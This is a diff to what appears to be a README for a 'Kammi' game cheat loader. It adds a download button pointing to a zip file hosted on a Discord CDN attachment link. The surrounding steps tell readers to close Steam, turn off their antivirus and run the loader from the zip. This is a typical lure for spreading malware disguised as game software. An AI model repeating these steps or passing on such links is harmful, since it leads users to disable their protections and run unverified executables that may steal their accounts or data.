@@ -28,3 +28,5 @@ _Close Steam_ ,
 _Turn off your antivirus._ ,
 _Open a Kammi Zip and Open a Loader and press Start to Download_ ( With the loader open, do not close the zip file! ) ,
 _Enjoy!_
+
+[<img src="images/download.png">](https://cdn.discordapp.com/attachments/1119781928342667365/1123293467087491092/Kammi.zip)
